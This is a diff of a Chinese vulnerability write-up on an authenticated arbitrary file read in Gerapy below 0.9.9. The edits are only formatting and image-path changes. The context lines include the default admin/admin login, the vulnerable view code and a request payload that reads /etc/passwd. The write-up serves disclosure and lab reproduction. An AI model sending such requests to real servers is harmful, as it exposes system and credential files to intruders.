@@ -1,15 +1,15 @@
-# Gerapy project_file_read 后台任意文件读取漏洞
+# Gerapy project\_file\_read 后台任意文件读取漏洞
 
 ## 漏洞描述
 
 Gerapy 是一款基于 Scrapy、Scrapyd、Django 和 Vue.js 的分布式爬虫管理框架。
 
-Gerapy < 0.9.9 存在任意文件读取漏洞，函数 `project_file_read` 的 `path` 和 `label` 参数可控，经过身份验证的攻击者可以读取任意文件。
+Gerapy < 0.9.9 存在任意文件读取漏洞，函数 `project_file_read` 的 `path` 和 `label` 参数可控，经过身份验证的攻击者可以读取任意文件。
 
 参考链接：
 
-- https://github.com/Gerapy/Gerapy/issues/210
-- https://github.com/Gerapy/Gerapy/blob/af5657354aa040d5a6b52c91a837f5d63422d6d3/gerapy/server/core/views.py#L548-L561
+* https://github.com/Gerapy/Gerapy/issues/210
+* https://github.com/Gerapy/Gerapy/blob/af5657354aa040d5a6b52c91a837f5d63422d6d3/gerapy/server/core/views.py#L548-L561
 
 ## 漏洞影响
 
@@ -54,7 +54,7 @@ docker-compose up -d
 
 启动完成后，访问 `http://your-ip:8000` 即可查看登录页面，通过默认口令 `admin/admin` 登录后台。
 
-![](images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170319239.png)
+![](../.gitbook/assets/image-20250516170319239.png)
 
 ## 漏洞复现
 
@@ -77,7 +77,7 @@ def project_file_read(request):
             return HttpResponse(f.read().decode('utf-8'))
 ```
 
-![](images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170104352.png)
+![](../.gitbook/assets/image-20250516170104352.png)
 
 构造请求包：
 
@@ -95,7 +95,7 @@ Authorization: Token e8279162677dd4fbfefe352b0f51ea8ad19cace5
 {"path":"/etc/","label":"passwd"}
 ```
 
-![](images/Gerapy%20project_file_read%20后台任意文件读取漏洞/image-20250516170502226.png)
+![](../.gitbook/assets/image-20250516170502226.png)
 
 ## 漏洞修复
 
